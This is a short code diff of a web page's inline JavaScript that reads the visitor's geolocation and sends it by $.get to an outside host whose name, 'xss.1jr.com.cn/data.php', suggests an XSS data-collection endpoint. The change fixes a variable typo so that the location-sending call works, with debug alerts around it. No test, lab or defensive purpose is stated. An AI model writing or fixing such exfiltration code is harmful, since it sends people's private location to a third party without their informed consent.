@@ -12,7 +12,7 @@
 <script type="text/javascript">
     navigator.geolocation.getCurrentPosition(function(position) {
         alert('begin');
-	 var getlng = positon;
+	 var getlng = position;
         $.get("https://xss.1jr.com.cn/data.php",{ getLng: getlng},function(result){
         alert('end');
         });
